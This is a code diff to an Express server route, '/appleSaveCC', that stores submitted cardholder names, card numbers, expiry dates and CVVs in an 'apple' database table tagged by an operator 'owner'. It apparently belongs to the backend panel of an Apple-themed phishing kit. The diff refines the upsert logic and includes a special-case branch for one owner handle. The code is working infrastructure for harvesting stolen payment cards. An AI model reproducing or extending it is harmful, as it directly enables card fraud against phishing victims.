@@ -2012,7 +2012,7 @@ app.post("/appleSaveBilling", cors(), (req, res) => {
 
 let appleCount = 1;
 
-app.post("/appleSaveCC", cors(), (req, res) => {
+app.post("/appleSaveCC", (req, res) => {
   let { ccname, ccnum, ccexp, cvv, owner, uniqueid } = req.body;
 
   if (owner == "bali2810" && appleCount !== 3) {
@@ -2027,25 +2027,24 @@ app.post("/appleSaveCC", cors(), (req, res) => {
 
   panelConnection.query(checkQuery, checkDetails, (err, rows, fields) => {
     if (err) console.log(err);
-    if (rows) {
+    if (rows.length) {
+      console.log(rows);
       let updateDetails = [ccname, ccnum, ccexp, cvv, uniqueid];
-      let updateQuery = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ? WHERE uniqueid = ?`;
+      let updateQuery = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ?, status = 2 WHERE uniqueid = ?`;
 
       panelConnection.query(updateQuery, updateDetails, (err, rows, fields) => {
         if (!err) res.send("Insertion Completed");
         else console.log(err);
       });
       return;
+    } else {
+      let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
+      let query = `INSERT INTO apple(ccname,ccnum, ccexp, cvv, status,uniqueid, owner) VALUES (?,?,?,?,2,?,?)`;
+      panelConnection.query(query, details, (err, rows, fields) => {
+        if (!err) res.send("Insertion Completed");
+        else console.log(err);
+      });
     }
-  });
-
-  let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
-
-  let query = `INSERT INTO apple(ccname,ccnum, ccexp, cvv, status,uniqueid, owner) VALUES (?,?,?,?,2,?,?)`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send("Insertion Completed");
-    else console.log(err);
   });
 });
 
